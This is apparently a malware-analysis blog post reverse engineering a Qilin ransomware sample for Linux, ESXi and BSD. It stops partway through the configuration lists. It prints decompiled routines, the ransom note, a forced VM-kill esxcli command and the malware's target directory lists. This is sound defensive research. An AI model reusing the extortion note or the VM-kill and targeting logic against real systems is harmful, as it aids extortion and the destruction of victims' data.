---
title: Reversing the Qilin ESXi ransomware
published: true
---

## Table of contents

* toc placeholder
{:toc}

## Introduction

The Qilin ransomware group (aka Agenda) was discovered in 2022, targeting enterprise systems including Windows, Linux, ESXi and BSD environments. They use different languages like C/C++, Rust and Go. Since ESXi is widely used in enterprise and cloud setups as a hypervisor, attacking it can cause a lot of damage quickly, making it easier to demand a ransom. You can find more details about them in this [detailed post](https://www.group-ib.com/blog/qilin-ransomware/).

In this post we will dive into reverse engineering a sample uploaded to [MalwareBazaar](https://bazaar.abuse.ch/browse.php?search=signature%3Aqilin) which as we will see later supports Linux, ESXi and BSD. Since Broadcom [ditched the free version of ESXi](https://knowledge.broadcom.com/external/article?legacyId=2107518) we will stick to static analysis and dynamic analysis under Linux.

## Executive summary

[This](https://bazaar.abuse.ch/sample/555964b2fed3cced4c75a383dd4b3cf02776dae224f4848dcc03510b1de4dbf4/) Qilin ransomware variant is an advanced threat targeting Linux, ESXi and BSD, capable of encrypting large amounts of data through multi-threading and recursive file traversal. It detects the host OS and in the case of ESXi it not only encrypts files but also executes commands to kill VMs and remove snapshots, ensuring that files are unlocked for encryption. The malware is highly configurable, parsing a range of command-line options for settings like paths, encryption delays and file exclusions. It uses 4096-bit RSA encryption via OpenSSL. The binary shows a clear intent to adapt to different environments and maximize damage, making it a serious threat.

## Detailed analysis

First we shorten the binary name so that the commands and outputs are easier to read in the following chapters.

```
$ mv 555964b2fed3cced4c75a383dd4b3cf02776dae224f4848dcc03510b1de4dbf4.elf qilin-esxi.elf
```

### Hashes

```
$ md5sum < qilin-esxi.elf
417ad60624345ef85e648038e18902ab  -
$ sha1sum < qilin-esxi.elf
e18e6f975ef8fce97790fb8ae583caad1ec7d5b3  -
$ sha256sum < qilin-esxi.elf
555964b2fed3cced4c75a383dd4b3cf02776dae224f4848dcc03510b1de4dbf4  -
```

### Overview

We can start with some basic command-line tools to get a quick high level overview.

The binary is statically linked and the symbols are stripped:

```
$ file qilin-esxi.elf
qilin-esxi.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
```
When dumping the section names we can see the typical sections used by `gcc`. It is unusual though that the binary contains `.ctors` and `.dtors` instead of `.init_array` and `.fini_array` as [gcc 4.7.0 and later](https://gcc.gnu.org/bugzilla/show_bug.cgi?id=46770) should use `.init_array` and `.fini_array`.

```
$ readelf -S qilin-esxi.elf 
There are 19 section headers, starting at offset 0x152530:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .note.gnu.pr[...] NOTE             0000000000400238  00000238
       0000000000000030  0000000000000000   A       0     0     8
  [ 2] .init             PROGBITS         0000000000401000  00001000
       0000000000000018  0000000000000000  AX       0     0     1
  [ 3] .text             PROGBITS         0000000000401040  00001040
       00000000000e7c9b  0000000000000000  AX       0     0     64
  [ 4] .fini             PROGBITS         00000000004e8cdb  000e8cdb
       000000000000000e  0000000000000000  AX       0     0     1
  [ 5] .rodata           PROGBITS         00000000004e9000  000e9000
       000000000003e390  0000000000000000   A       0     0     64
  [ 6] .eh_frame         PROGBITS         0000000000527390  00127390
       0000000000028c0c  0000000000000000   A       0     0     8
  [ 7] .gcc_except_table PROGBITS         000000000054ff9c  0014ff9c
       000000000000000d  0000000000000000   A       0     0     1
  [ 8] .tdata            PROGBITS         0000000000550fb8  0014ffb8
       0000000000000008  0000000000000000 WAT       0     0     8
  [ 9] .tbss             NOBITS           0000000000550fc0  0014ffc0
       0000000000000008  0000000000000000 WAT       0     0     4
  [10] .ctors            PROGBITS         0000000000550fc0  0014ffc0
       0000000000000010  0000000000000000  WA       0     0     8
  [11] .dtors            PROGBITS         0000000000550fd0  0014ffd0
       0000000000000010  0000000000000000  WA       0     0     8
  [12] .data.rel.ro      PROGBITS         0000000000550fe0  0014ffe0
       0000000000000010  0000000000000000  WA       0     0     16
  [13] .got              PROGBITS         0000000000550ff0  0014fff0
       0000000000000010  0000000000000000  WA       0     0     8
  [14] .got.plt          PROGBITS         0000000000551000  00150000
       0000000000000018  0000000000000008  WA       0     0     8
  [15] .data             PROGBITS         0000000000551020  00150020
       0000000000002450  0000000000000000  WA       0     0     32
  [16] .bss              NOBITS           0000000000553480  00152470
       000000000000c040  0000000000000000  WA       0     0     32
  [17] .comment          PROGBITS         0000000000000000  00152470
       0000000000000022  0000000000000001  MS       0     0     1
  [18] .shstrtab         STRTAB           0000000000000000  00152492
       000000000000009e  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  D (mbind), l (large), p (processor specific)
```
The `.comment` section is not stripped so we can see it was built with `gcc` 11.2.0 which was created with [crosstool-NG](https://crosstool-ng.github.io/) 1.25.0. The authors probably had to create a custom toolchain which can target ESXi. The code might have been written in C++ or C/C++ since the section `.gcc_except_table` is also present.

```
$ readelf -x .comment qilin-esxi.elf

Hex dump of section '.comment':
  0x00000000 4743433a 20286372 6f737374 6f6f6c2d GCC: (crosstool-
  0x00000010 4e472031 2e32352e 30292031 312e322e NG 1.25.0) 11.2.
  0x00000020 3000                                0.
```
The binary is not packed which is good news because it allows us to perform static analysis with Ghidra.

```
$ diec --entropy qilin-esxi.elf
Total 6.09887: not packed
  0|PT_LOAD(0)|0|4096|0.433816: not packed
  1|PT_LOAD(1)|4096|950272|6.10384: not packed
  2|PT_LOAD(2)|954368|421888|5.21901: not packed
  3|PT_LOAD(3)|1372160|13424|3.60105: not packed
  4||1385584|1408|2.30311: not packed
```

Unfortunately `capa` can not help us in this case:

```
$ capa qilin-esxi.elf 
loading : 100%|█████████████████████████████████████████████| 661/661 [00:00<00:00, 2829.10 rules/s]
ERROR:capa:--------------------------------------------------------------------------------
ERROR:capa: Input file does not appear to target a supported OS.
ERROR:capa: 
ERROR:capa: capa currently only supports analyzing executables for some operating systems (including Windows and Linux).
ERROR:capa:--------------------------------------------------------------------------------
```

There are too many strings to list here but some relevant ones are shown below. Based on these we can assume that the software uses multithreading, encrypts files, includes a usage information string, has hardcoded paths, executes ESXi commands and uses OpenSSL with possibly asymmetric encryption.

```
$ strings qilin-esxi.elf
...
Cannot queue job %08x: queue is full. Waiting...
...
Your network/system was encrypted.
...
Usage:
	%s OPTION ...
...
/usr/home
...
esxcli vm process kill -t force -w %llu
...
OPENSSL_init
...
-----BEGIN PUBLIC KEY-----
...
```

### Static analysis (Ghidra)

After the initial analysis we can move to a more in-depth analysis using Ghidra. Please note that during the analysis some symbols (mainly functions) have been renamed, for example `FUN_00401d20()` --> `mw_print_usage()`. The binary is stripped so Ghidra gives names to symbols like `FUN_<address>`, `DAT_<address>` etc. after it runs its initial analysis. My personal preference is also to add the `mw_` prefix (meaning malware) to all of the functions so they can be filtered and searched later more easily, and the `_w` suffix (meaning wrapper) to wrapper functions. If there are multiple wrapper levels `_ww` is used and so on.

Since the binary has a lot of strings we can start with looking at them to see where and how these strings are used. Most (if not all) of them are located in `.rodata`.

#### Command-line arguments

As we saw earlier the authors included a usage description that lists all available command-line options:

```
                             s__Usage:_%s_OPTION_..._OPTIONS:_-_004e9060     XREF[1]:     mw_print_usage:00401d29(*)  
        004e9060 0a 55 73        ds         "\nUsage:\n\t%s OPTION ...\n\nOPTIONS:\n\t-d,-
```

```
Usage:
	%s OPTION ...

OPTIONS:
	-d,--debug               Enable debug mode (logging level set to DEBUG, disables backgrounding)
	   --dry-run             Perform scan for files to be processed, do not modify them
	-h,--help                This help
	-l,--log-level <number>  Set logging level. Values are from 0 for FATAL up to 5 for DEBUG
	   --no-df               Ignore configured white-/black- lists of directories
	   --no-ef               Ignore configured white-/black- lists of extensions
	   --no-ff               Ignore configured white-/black- lists of files
	   --no-proc-kill        Disables process kill
	-R,--no-rename           Disables rename of completed files
	   --no-snap-rm          Disables snapshot deletion
	   --no-vm-kill          Disables VM kill
	-p,--path <string>       Specifies top-level directory for files search
	   --password <string>   Password for startup
	-r,--rename              Enables rename of completed files (default)
	-t,--timer <number>      Enabled timed delay before encryption (seconds)
	-w,--whitelist           Use whitelists for inclusion instead of blacklists for exclusion (later is default behavior)
	-y,--yes                 Assume answer 'yes' on all questions (script mode)
```
This list is a good starting point to understand the capabilities of the malware, though it might not be exhaustive. We can check for any undocumented options. After following the cross-references of the usage string we can locate the argument parser function. Based on the passed arguments it is likely [getopt_long()](https://man7.org/linux/man-pages/man3/getopt_long.3.html).

Man page:

```c
       int getopt_long(int argc, char *argv[],
                  const char *optstring,
                  const struct option *longopts, int *longindex);
```

Ghidra:

```c
void mw_main(undefined4 param_1,undefined8 *param_2)

{
...
    ret = mw_getopt_long(param_1,param_2,"dhl:p:Rrt:wy",&PTR_s_debug_00551040,&local_438)
```

After going through the function using an [ASCII table](https://typst.app/tools/ascii-table/) we can confirm that there are no hidden features (the `// ...` comments were added manually):

```c
  while( true ) {
    local_438 = local_438 & 0xffffffff00000000;
    ret = mw_getopt_long(param_1,param_2,"dhl:p:Rrt:wy",&PTR_s_debug_00551040,&local_438);
    if (ret == -1) break;
    if (false) {
switchD_004010e5_caseD_53:
      mw_print_usage(*param_2);
                    /* WARNING: Subroutine does not return */
      mw_exit(1);
    }
    switch(ret) {
    case 0x52:	// "-R"
    case 0x108:	// "--no-rename"
      piVar4[0x2a] = 0;
      mw_log(4,"Rename final file disabled\n");
      break;
    default:
      goto switchD_004010e5_caseD_53;
    case 100:	  // "-d"
    case 0x100:	// "--debug"
      mw_log_level = 4;
      mw_log(4,"Debug logging enabled\n");
      piVar4[0x2e] = 1;
      mw_log(4,"Backgrounding disabled\n");
      break;
    case 0x68:	// "-h"
    case 0x102:	// "--help"
      mw_print_usage(*param_2);
                    /* WARNING: Subroutine does not return */
      mw_exit(0);
    case 0x6c:	// "-l"
    case 0x103:	// "--log-level"
      mw_log_level = FUN_004db595(DAT_0055efd8);
      mw_log(4,"Logging level set to %d\n",mw_log_level);
      break;
    case 0x70:	// "-p"
    case 0x10b:	// "--path"
      uVar8 = FUN_004d9df5(DAT_0055efd8);
      *(undefined8 *)(piVar4 + 0x18) = uVar8;
      mw_log(4,"Search path: %s\n",uVar8);
      break;
    case 0x72:	// "-r"
    case 0x10d:	// "--rename"
      piVar4[0x2a] = 1;
      mw_log(4,"Rename final file enabled\n");
      break;
    case 0x74:	// "-t"
    case 0x10e:	// "--timer"
      ret = FUN_004db595(DAT_0055efd8);
      piVar4[0x2b] = ret;
      mw_log(4,"Enabled timer: %d\n",ret);
      break;
    case 0x77:	// "-w"
    case 0x10f:	// "--whitelist"
      *(undefined *)(piVar4 + 0x30) = 1;
      mw_log(4,"Enabled whitelist mode: %d\n",1);
      break;
    case 0x79:	// "-y"
    case 0x110:	// "--yes"
      *(undefined *)((long)piVar4 + 0xc1) = 1;
      mw_log(4,"Assume answer \'yes\' on all questions enabled (script mode)\n");
      break;
    case 0x101:	// "--dry-run"
      *(undefined *)(piVar4 + 0x28) = 1;
      mw_log(4,"Dry run enabled\n");
      break;
    case 0x104:	// "--no-df"
      *(undefined *)(piVar4 + 0x29) = 1;
      mw_log(4,"Ignore configured white-/black- lists of directories\n");
      break;
    case 0x105:	// "--no-ef"
      *(undefined *)((long)piVar4 + 0xa5) = 1;
      mw_log(4,"Ignore configured white-/black- lists of extensions\n");
      break;
    case 0x106:	// "--no-ff"
      *(undefined *)((long)piVar4 + 0xa6) = 1;
      mw_log(4,"Ignore configured white-/black- lists of files\n");
      break;
    case 0x107:	// "--no-proc-kill"
      *(undefined *)((long)piVar4 + 0xa2) = 1;
      mw_log(4,"Kill processes disabled\n");
      break;
    case 0x109:	// "--no-snap-rm"
      *(undefined *)((long)piVar4 + 0xa3) = 1;
      mw_log(4,"Remove snapshots disabled\n");
      break;
    case 0x10a:	// "--no-vm-kill"
      *(undefined *)((long)piVar4 + 0xa1) = 1;
      mw_log(4,"Kill VMs disabled\n");
      break;
    case 0x10c:	// "--password"
      uVar8 = FUN_004d9df5(DAT_0055efd8);
      *(undefined8 *)(piVar4 + 0x2c) = uVar8;
      mw_log(4,"Password: %s\n",uVar8);
    }
  }
```

#### Ransomware initialization

After the command-line arguments are passed the ransomware executes some initialization tasks.

Loads the following 4096-bit RSA public key:

```
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3a4G68kgJX2bwWZX23Yz
zPI68Fl6eocJ+XLcPN9dvG3o/SV04F2zE7nWUhBbwsBHiX8bIquqVyVV+Y93FOCn
eJODySiy+bLZ1QfXKMjoNbhHq+aeuYCV8na3LF3hoGpST6uJpXUxbhZOBqHHbbx6
vVy1fXOUEvaEOhqkglfDUQ7/fH6sT1p/3RyCtGi3o7588oMHOVgz3jZux2dqp9Zy
Ps9MqZs0OtcBAXTG4EmD8yz2RgH+D9j756snWNZeknnjNO+KUARDSICKFOYtb3wz
xYFVvACB3sJuTpAJ2HuaWIEo8NljGsMkNTqy3tFY0WnUBxAgt7AMUM+Ex75DGa9H
IAXd+bTOfo+zyUGKiUFBqBZjo8T0ueTpr8BZb98fl5/LFpXmBuR/dJBfeuq3a4vK
Fpxx796zUe/hoiBSvw9GzLyYa5A5Lbcz2qOi9RTYTEmZDX9qss+GfI54ZM2vrxyC
nUJz/dDxxjFOujMJJBN9b1G9KIgiD3Sh41RLfEEemOG4Fo+1TbegKcK11a3LvUfL
g3PhwflhaZwuwz3Nrie9vS9NKM+935rCkjeP1tap8NvrKow4F0KPg0loES06/fjm
47PI12ZrUc6YE5zH3CwtiCXW4BUlpPacZgUJRpvZAODHYlejTnxtiWvq4XLe1A+3
98/IXu0IMoFWAH2KnlPsczsCAwEAAQ==
-----END PUBLIC KEY-----
```

```
$ openssl rsa -in qilin.key -pubin -text -noout
Public-Key: (4096 bit)
...
```

Detects the OS via `uname()`:

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined mw_uname()
             undefined         AL:1           <RETURN>
                             mw_uname                                        XREF[3]:     mw_detect_os:00404130(c), 
                                                                                          FUN_004e570b:004e5721(c), 
                                                                                          0054a728(*)  
        004d4326 b8 3f 00        MOV        EAX, 0x3f
        004d432b 0f 05           SYSCALL

```

Note: the x64 syscall table is available [here](https://github.com/torvalds/linux/blob/c45323b7560ec87c37c729b703c86ee65f136d75/arch/x86/entry/syscalls/syscall_64.tbl) and [here](https://x64.syscall.sh/).

```c
undefined4 mw_detect_os(undefined4 *param_1)

{
...
  
  iVar1 = mw_uname(auStack_1a8);
  if (iVar1 == -1) {
    puVar3 = (undefined4 *)FUN_004d4823();
    uVar4 = mw_get_error_msg(*puVar3);
    mw_log(1,"Failed to get system type: %d (%s)\n",*puVar3,uVar4);
    uVar2 = 0xffffffff;
  }
  else {
    iVar1 = FUN_004d9dc5(auStack_1a8,"Linux");
    if (iVar1 == 0) {
      *param_1 = 1;
      mw_log(4,"Detected OS: Linux (%d)\n",1);
      return 0;
    }
    iVar1 = FUN_004d9dc5(auStack_1a8,"VMKernel");
    if (iVar1 == 0) {
      *param_1 = 2;
      mw_log(4,"Detected OS: ESXi (%d)\n",2);
      return 0;
    }
    iVar1 = FUN_004d9dc5(auStack_1a8,"FreeBSD");
    if (iVar1 != 0) {
      *param_1 = 0;
      mw_log(4,"Detected OS: unknown (%d)\n",0);
      return 0;
    }
    *param_1 = 3;
    mw_log(4,"Detected OS: FreeBSD (%d)\n",3);
    uVar2 = 0;
  }
  return uVar2;
}
```

Checks the number of CPU cores by accessing `/var/run/dmesg.boot` on BSD and `/proc/cpuinfo` on other systems.

Sets the maximum [number of open files (0x7)](https://github.com/torvalds/linux/blob/c45323b7560ec87c37c729b703c86ee65f136d75/include/uapi/asm-generic/resource.h#L31) to 4096 (0x1000) via `rlimit()`. 0x1000 is used twice since the [rlimit struct](https://man7.org/linux/man-pages/man2/getrlimit.2.html) contains 2 fields: soft limit and hard limit.

```
# define RLIMIT_NOFILE		7	/* max number of open files */
```

```
        00401e6d 48 89 e6        MOV        RSI, RSP
        00401e70 bf 07 00        MOV        EDI, 0x7
        00401e75 48 c7 04        MOV        qword ptr [RSP]=>local_28, 0x1000
        00401e7d 48 c7 44        MOV        qword ptr [RSP + local_20], 0x1000
        00401e86 e8 04 24        CALL       mw_set_rlimit                                    undefined mw_set_rlimit()
```
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined mw_set_rlimit()
             undefined         AL:1           <RETURN>
                             mw_set_rlimit                                   XREF[2]:     mw_init_env:00401e86(c), 
                                                                                          0054a6c0(*)  
        004d428f 89 ff           MOV        EDI, EDI
        004d4291 b8 a0 00        MOV        EAX, 0xa0
        004d4296 0f 05           SYSCALL

```

Sets the number of threads to at least 2:

```c
void mw_init_env(int *param_1)

{
...
    mw_detect_os(param_1);
    if (*param_1 == 3) {
      iVar3 = mw_detect_cpu_bsd();
    }
    else {
      iVar3 = mw_detect_cpu_other();
    }
    param_1[1] = iVar3;
...
    uVar9 = param_1[1];
    if (uVar9 < 2) {
      param_1[1] = 2;
      uVar9 = 2;
    }
    mw_log(4,"Number of threads: %u\n",uVar9);
```

Loads the configured filename (if set) that will contain the ransomware notes:

```
                             PTR_s_o7L03e8F9J_00551c60                       XREF[9]:     mw_main:00401084(R), 
                                                                                          mw_main:00401778(R), 
                                                                                          mw_main:004017e3(R), 
                                                                                          mw_main:00401880(R), 
                                                                                          mw_main:004018ea(R), 
                                                                                          mw_init_env:00401ebc(R), 
                                                                                          004026d6(R), 
                                                                                          mw_parse_config:0040393d(R), 
                                                                                          FUN_00403d00:00403dfc(R)  
        00551c60 99 b0 4e        addr       s_o7L03e8F9J_004eb099                            = "o7L03e8F9J"

```

```c
void mw_main(undefined4 param_1,undefined8 *param_2)

{
...
  puVar10 = PTR_s_o7L03e8F9J_00551c60;
...
  *(undefined **)(piVar5 + 0x1c) = puVar10;
```

```c
void mw_init_env(int *param_1)

{
...
    puVar1 = PTR_s_o7L03e8F9J_00551c60;
    if (*(long *)(param_1 + 0x1c) != 0) {
      lVar4 = mw_strlen(PTR_s_o7L03e8F9J_00551c60);
      uVar6 = mw_alloc(lVar4 + 0xd);
      *(undefined8 *)(param_1 + 0x26) = uVar6;
      mw_sprintf(uVar6,"%s_RECOVER.txt",puVar1);
    }
```
Ransomware notes:

```
-- Qilin 

Your network/system was encrypted. 
Encrypted files have new extension. 

-- Compromising and sensitive data 

We have downloaded compromising and sensitive data from you system/network 
If you refuse to communicate with us and we do not come to an agreement, your data will be published. 
Data includes: 
- Employees personal data, CVs, DL , SSN. 
- Complete network map including credentials for local and remote services. 
- Financial information including clients data, bills, budgets, annual reports, bank statements. 
- Complete datagrams/schemas/drawings for manufacturing in solidworks format 
- And more... 

-- Warning 

1) If you modify files - our decrypt software won't able to recover data 
2) If you use third party software - you can damage/modify files (see item 1) 
3) You need cipher key / our decrypt software to restore you files. 
4) The police or authorities will not be able to help you get the cipher key. We encourage you to consider your decisions. 

-- Recovery 

1) Download tor browser: https://www.torproject.org/download/ 
2) Go to domain 
3) Enter credentials-- Credentials 

Extension: o7L03e8F9J 
Domain: [redacted].onion 
login: [redacted] 
password: [redacted]
```

Executes various ESXi commands which initially seem unnecessary but are actually workarounds for known ESXi issues:

```c
int mw_esxcfg(void)

{
...
  pcVar4 = 
  "for I in $(esxcli storage filesystem list |grep \'VMFS-5\' |awk \'{print $1}\'); do vmkfstools -c  10M -d eagerzeroedthick $I/eztDisk > /dev/null; vmkfstools -U $I/eztDisk > /dev/null; done"
  ;
...
  iVar1 = mw_run_cmd2(pcVar4);
...
  pcVar4 = 
  "for I in $(esxcli storage filesystem list |grep \'VMFS-6\' |awk \'{print $1}\'); do vmkfstools -c  10M -d eagerzeroedthick $I/eztDisk > /dev/null; vmkfstools -U $I/eztDisk > /dev/null; done"
  ;
...
  iVar1 = mw_run_cmd2(pcVar4);
...
  iVar1 = mw_run_cmd2("esxcfg-advcfg -s 32768 /BufferCache/MaxCapacity");
...
  iVar1 = mw_run_cmd2("esxcfg-advcfg -s 20000 /BufferCache/FlushInterval");
...
}
```

These commands were copied from the following or similar pages:
- [https://knowledge.broadcom.com/external/article/318028/vmfs6-heap-memory-exhaustion-on-vsphere.html](https://knowledge.broadcom.com/external/article/318028/vmfs6-heap-memory-exhaustion-on-vsphere.html)
- [https://www.virten.net/2020/11/heads-up-vmfs6-heap-exhaustion-in-esxi-7-0/](https://www.virten.net/2020/11/heads-up-vmfs6-heap-exhaustion-in-esxi-7-0/)
- [http://web.archive.org/web/20240520015714/https://knowledge.broadcom.com/external/article?legacyId=2052302](http://web.archive.org/web/20240520015714/https://knowledge.broadcom.com/external/article?legacyId=2052302)


#### Parsing the configuration

The ransomware is highly configurable as detailed [here](https://www.group-ib.com/blog/qilin-ransomware/). Next it loads the configuration from the `.data` section:

Process blacklist:

```
                             PTR_s_kvm_00551c40                              XREF[4]:     mw_proc_kill_w:00401b60(*), 
                                                                                          mw_parse_config:00403602(R), 
                                                                                          mw_parse_config:00403614(*), 
                                                                                          00551c30(*)  
        00551c40 6e ae 4e        addr       s_kvm_004eae6e                                   = "kvm"
                             PTR_s_qemu_00551c48                             XREF[1]:     mw_parse_config:00403602(R)  
        00551c48 94 b0 4e        addr       s_qemu_004eb094                                  = "qemu"
        00551c50 5c ae 4e        addr       s_xen_004eae53+9                                 = "xen"
        00551c58 00              ??         00h
```

Directory blacklist:
```
                             PTR_s_/boot/_00551bc0                           XREF[4]:     mw_main:0040148e(*), 
                                                                                          mw_parse_config:00403682(R), 
                                                                                          mw_parse_config:00403694(*), 
                                                                                          00551ba0(*)  
        00551bc0 30 b0 4e        addr       s_/boot/_004eb030                                = "/boot/"
                             PTR_s_/proc/_00551bc8                           XREF[1]:     mw_parse_config:00403682(R)  
        00551bc8 37 b0 4e        addr       s_/proc/_004eb037                                = "/proc/"
        00551bd0 3e b0 4e        addr       s_/sys/_004eb03e                                 = "/sys/"
        00551bd8 44 b0 4e        addr       s_/run/_004eb044                                 = "/run/"
        00551be0 4a b0 4e        addr       s_/dev/_004eb04a                                 = "/dev/"
        00551be8 50 b0 4e        addr       s_/lib/_004eb050                                 = "/lib/"
        00551bf0 56 b0 4e        addr       s_/etc/_004eb056                                 = "/etc/"
        00551bf8 5c b0 4e        addr       s_/bin/_004eb05c                                 = "/bin/"
        00551c00 62 b0 4e        addr       s_/mbr/_004eb062                                 = "/mbr/"
        00551c08 68 b0 4e        addr       s_/lib64/_004eb068                               = "/lib64/"
        00551c10 70 b0 4e        addr       s_/vmware/lifecycle/_004eb070                    = "/vmware/lifecycle/"
        00551c18 83 b0 4e        addr       s_/vdtc/_004eb083                                = "/vdtc/"
        00551c20 8a b0 4e        addr       s_/healthd/_004eb08a                             = "/healthd/"
```

File blacklist:
```
                             PTR_PTR_s_initrd_00551b38                       XREF[3]:     mw_main:00401492(R), 
                                                                                          mw_parse_config:004036c5(R), 
                                                                                          mw_parse_config:00403714(R)  
        00551b38 40 1b 55        addr       PTR_s_initrd_00551b40                            = 004eafbb
                             PTR_s_initrd_00551b40                           XREF[4]:     mw_main:00401499(*), 
                                                                                          mw_parse_config:00403702(R), 
                                                                                          mw_parse_config:00403714(*), 
                                                                                          00551b38(*)  
        00551b40 bb af 4e        addr       s_initrd_004eafbb                                = "initrd"
                             PTR_s_vmlinuz_00551b48                          XREF[1]:     mw_parse_config:00403702(R)  
        00551b48 c2 af 4e        addr       s_vmlinuz_004eafc2                               = "vmlinuz"
        00551b50 ca af 4e        addr       s_basemisc.tgz_004eafca                          = "basemisc.tgz"
        00551b58 d7 af 4e        addr       s_boot.cfg_004eafd7                              = "boot.cfg"
        00551b60 e0 af 4e        addr       s_bootpart.gz_004eafe0                           = "bootpart.gz"
        00551b68 ec af 4e        addr       s_features.gz_004eafec                           = "features.gz"
        00551b70 f8 af 4e        addr       s_imgdb.tgz_004eaff8                             = "imgdb.tgz"
        00551b78 02 b0 4e        addr       s_jumpstrt.gz_004eb002                           = "jumpstrt.gz"
        00551b80 0e b0 4e        addr       s_onetime.tgz_004eb00e                           = "onetime.tgz"
        00551b88 1a b0 4e        addr       s_state.tgz_004eb01a                             = "state.tgz"
        00551b90 24 b0 4e        addr       s_useropts.gz_004eb024                           = "useropts.gz"
```

File extension blacklist:
```
                             PTR_s_v00_00551a40                              XREF[4]:     mw_main:004014ae(*), 
                                                                                          mw_parse_config:00403782(R), 
                                                                                          mw_parse_config:00403794(*), 
                                                                                          00551a20(*)  
        00551a40 43 af 4e        addr       s_v00_004eaf43                                   = "v00"
                             PTR_s_v01_00551a48                              XREF[1]:     mw_parse_config:00403782(R)  
        00551a48 47 af 4e        addr       s_v01_004eaf47                                   = "v01"
        00551a50 4b af 4e        addr       s_v02_004eaf4b                                   = "v02"
        00551a58 4f af 4e        addr       s_v03_004eaf4f                                   = "v03"
        00551a60 53 af 4e        addr       s_v04_004eaf53                                   = "v04"
        00551a68 57 af 4e        addr       s_v05_004eaf57                                   = "v05"
        00551a70 5b af 4e        addr       s_v06_004eaf5b                                   = "v06"
        00551a78 5f af 4e        addr       s_v07_004eaf5f                                   = "v07"
        00551a80 63 af 4e        addr       s_v08_004eaf63                                   = "v08"
        00551a88 67 af 4e        addr       s_v09_004eaf67                                   = "v09"
        00551a90 6b af 4e        addr       s_b00_004eaf6b                                   = "b00"
        00551a98 6f af 4e        addr       s_b01_004eaf6f                                   = "b01"
        00551aa0 73 af 4e        addr       s_b02_004eaf73                                   = "b02"
        00551aa8 77 af 4e        addr       s_b03_004eaf77                                   = "b03"
        00551ab0 7b af 4e        addr       s_b04_004eaf7b                                   = "b04"
        00551ab8 7f af 4e        addr       s_b05_004eaf7f                                   = "b05"
        00551ac0 83 af 4e        addr       s_b06_004eaf83                                   = "b06"
        00551ac8 87 af 4e        addr       s_b07_004eaf87                                   = "b07"
        00551ad0 8b af 4e        addr       s_b08_004eaf8b                                   = "b08"
        00551ad8 8f af 4e        addr       s_b09_004eaf8f                                   = "b09"
        00551ae0 93 af 4e        addr       s_t00_004eaf93                                   = "t00"
        00551ae8 97 af 4e        addr       s_t01_004eaf97                                   = "t01"
        00551af0 9b af 4e        addr       s_t02_004eaf9b                                   = "t02"
        00551af8 9f af 4e        addr       s_t03_004eaf9f                                   = "t03"
        00551b00 a3 af 4e        addr       s_t04_004eafa3                                   = "t04"
        00551b08 a7 af 4e        addr       s_t05_004eafa7                                   = "t05"
        00551b10 ab af 4e        addr       s_t06_004eafab                                   = "t06"
        00551b18 af af 4e        addr       s_t07_004eafaf                                   = "t07"
        00551b20 b3 af 4e        addr       s_t08_004eafb3                                   = "t08"
        00551b28 b7 af 4e        addr       s_t09_004eafb7                                   = "t09"
```

Directory whitelist:
```
                             PTR_s_/home_00551920                            XREF[4]:     mw_main:00401549(*), 
                                                                                          mw_parse_config:00403802(R), 
                                                                                          mw_parse_config:00403814(*), 
                                                                                          00551908(*)  
        00551920 c0 ad 4e        addr       s_/home_004eadbc+4                               = "/home"
                             PTR_s_/usr/home_00551928                        XREF[1]:     mw_parse_config:00403802(R)  
        00551928 bc ad 4e        addr       s_/usr/home_004eadbc                             = "/usr/home"
        00551930 c6 ad 4e        addr       s_/tmp_004eadc6                                  = "/tmp"
        00551938 cb ad 4e        addr       s_/var/www_004eadcb                              = "/var/www"
        00551940 d4 ad 4e        addr       s_/usr/local/www_004eadd4                        = "/usr/local/www"
        00551948 e3 ad 4e        addr       s_/mnt_004eade3                                  = "/mnt"
        00551950 e8 ad 4e        addr       s_/media_004eade8                                = "/media"
        00551958 ef ad 4e        addr       s_/srv_004eadef                                  = "/srv"
        00551960 f4 ad 4e        addr       s_/data_004eadf4                                 = "/data"
        00551968 fa ad 4e        addr       s_/backup_004eadfa                               = "/backup"
        00551970 02 ae 4e        addr       s_/var/lib/mysql_004eae02                        = "/var/lib/mysql"
        00551978 11 ae 4e        addr       s_/var/mail_004eae11                             = "/var/mail"
        00551980 1b ae 4e        addr       s_/var/spool/mail_004eae1b                       = "/var/spool/mail"
        00551988 2b ae 4e        addr       s_/var/vm_004eae2b                               = "/var/vm"
        00551990 33 ae 4e        addr       s_/var/lib/vmware_004eae33                       = "/var/lib/vmware"
        00551998 43 ae 4e        addr       s_/opt/virtualbox_004eae43                       = "/opt/virtualbox"
        005519a0 53 ae 4e        addr       s_/var/lib/xen_004eae53                          = "/var/lib/xen"
        005519a8 60 ae 4e        addr       s_/var/opt/xen_004eae60                          = "/var/opt/xen"
        005519b0 6d ae 4e        addr       s_/kvm_004eae6d                                  = "/kvm"
        005519b8 72 ae 4e        addr       s_/var/lib/docker_004eae72                       = "/var/lib/docker"
        005519c0 82 ae 4e        addr       s_/var/lib/libvirt_004eae82                      = "/var/lib/libvirt"
        005519c8 93 ae 4e        addr       s_/var/run/sr-mount_004eae93                     = "/var/run/sr-mount"
        005519d0 a5 ae 4e        addr       s_/var/lib/postgresql_004eaea5                   = "/var/lib/postgresql"
        005519d8 b9 ae 4e        addr       s_/var/lib/redis_004eaeb9                        = "/var/lib/redis"
        005519e0 c8 ae 4e        addr       s_/var/lib/mongodb_004eaec8                      = "/var/lib/mongodb"
        005519e8 d9 ae 4e        addr       s_/var/lib/couchdb_004eaed9                      = "/var/lib/couchdb"
        005519f0 ea ae 4e        addr       s_/var/lib/neo4j_004eaeea                        = "/var/lib/neo4j"
        005519f8 f9 ae 4e        addr       s_/var/lib/cassandra_004eaef9                    = "/var/lib/cassandra"
        00551a00 0c af 4e        addr       s_/var/lib/riak_004eaf0c                         = "/var/lib/riak"
        00551a08 1a af 4e        addr       s_/var/lib/influxdb_004eaf1a                     = "/var/lib/influxdb"
